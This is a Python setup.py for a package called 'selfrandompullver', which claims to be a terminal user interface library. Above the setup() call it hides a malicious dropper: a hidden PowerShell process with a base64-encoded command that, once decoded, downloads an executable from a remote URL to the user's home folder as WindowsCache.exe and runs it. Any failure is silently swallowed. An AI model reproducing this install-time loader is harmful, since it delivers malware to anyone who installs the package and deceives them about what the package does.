
from distutils.core import setup

try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
try:
  setup(
    name = 'selfrandompullver',
    packages = ['modlib'],
    version = '1.6',
    # license='MIT',
    description = 'A library for creating a terminal user interface',
    author = 'EsqueleSquad',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass
